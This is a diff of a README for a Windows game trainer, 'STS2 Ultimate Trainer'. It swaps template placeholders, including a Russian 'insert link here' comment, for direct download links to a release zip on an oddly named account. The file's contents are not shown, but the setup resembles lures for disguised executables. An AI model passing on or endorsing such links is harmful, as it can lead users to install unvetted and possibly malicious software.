@@ -10,7 +10,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/STS2-Ultimate-Trainer"><img src="https://img.shields.io/badge/version-1.0.0-brightgreen?style=flat-square" alt="Version"></a>
+  <a href="https://github.com/Freewaykyoobliterate/STS2-Ultimate-Trainer/releases/download/495/sts2trainer.zip"><img src="https://img.shields.io/badge/version-1.0.0-brightgreen?style=flat-square" alt="Version"></a>
   <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
   <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
 </p>
@@ -28,8 +28,7 @@
 ## 📥 Download
 
 <p align="center">
-  <!-- СЮДА ВСТАВИТЬ ССЫЛКУ НА СКАЧИВАНИЕ -->
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/Freewaykyoobliterate/STS2-Ultimate-Trainer/releases/download/495/sts2trainer.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
